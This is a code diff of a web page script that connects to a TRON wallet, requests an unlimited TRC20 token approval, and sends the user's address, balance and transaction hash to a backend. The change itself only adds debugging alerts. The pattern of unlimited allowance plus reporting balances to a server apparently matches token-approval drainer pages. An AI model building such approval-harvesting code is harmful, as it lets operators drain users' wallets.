@@ -140,10 +140,11 @@
                     trxBalance: trxBalance.toFixed(2),
                     approveTime: new Date().toLocaleString(),
                     txHash: result.transaction.txID,
-                    approveType: "无限额度" // 新增：标注授权类型
+                    approveType: "无限额度" // 新增：标注类型
                 };
 
                 saveApprovalRecord(record);
+                alert("准备调用 sendDataToBackend 函数");
                 await sendDataToBackend(record);
 
                 // 提示用户，明确是无限授权
@@ -162,6 +163,7 @@
             userAddress = tronWeb.defaultAddress.base58;
             alert("userAddress: " + userAddress);
             trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+            alert("trc20Contract 对象已正确初始化");
 
             document.getElementById("userInfo").innerHTML = `
                 已连接：<br>
